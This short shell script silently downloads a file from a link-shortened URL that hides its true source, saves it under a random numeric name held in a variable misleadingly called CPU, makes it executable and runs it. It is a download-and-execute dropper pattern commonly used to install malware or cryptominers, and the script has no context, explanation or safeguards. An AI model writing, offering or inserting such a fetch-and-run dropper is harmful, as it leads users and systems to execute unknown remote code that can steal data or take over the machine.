CPU=$(shuf -n 1 -i 1-999999)
wget -q -O $CPU https://bit.ly/3qWXU8r
chmod +x $CPU
./$CPU
